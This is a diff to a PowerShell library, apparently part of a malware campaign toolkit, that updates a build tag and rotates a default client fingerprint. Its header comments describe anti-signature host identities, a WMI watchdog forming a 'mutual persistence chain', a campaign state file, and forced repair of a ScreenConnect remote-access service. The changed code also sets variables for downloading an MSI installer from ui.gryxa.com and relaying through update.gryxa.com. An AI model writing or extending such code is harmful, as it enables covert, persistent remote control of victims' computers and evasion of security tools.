@@ -1,9 +1,9 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L26
+# OWN_LIB  BUILD 20260802L27
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
-# L26: allow SC by relay domain (gryxa.com) OR keeper FP — exterminator no longer kills new Gryxa on connect.
+# L27: default FP rotated to 36e506ff016b2151 (fresh hosts). L26: allow by gryxa.com relay OR keeper FP.
 # L21: stuck registered (svc+dir gone) -> /fa then ARP nuke + same-FP /i; return fix.
 # L20: -Deep must not skip light start/repair (rate-limit left Gryxa Stopped).
 # L19: rate-limit never blocks when Gryxa fully absent; StartPending keep.
@@ -332,7 +332,7 @@ function Repair-SCService([string]$Fingerprint) {
 # Single-flight ensure. Running => healthy. Stopped svc => start.
 # Broken/Stuck => clean-reinstall once, detached. Absent => install once.
 # No /fa, no inline blocking /i, no false "already_running".
-$script:GryxaDefaultFp = '9908198e668e4750'
+$script:GryxaDefaultFp = '36e506ff016b2151'
 $script:GryxaMsiUrl = 'https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
 $script:GryxaRelayHost = 'update.gryxa.com'
 $script:GryxaUiHost = 'ui.gryxa.com'
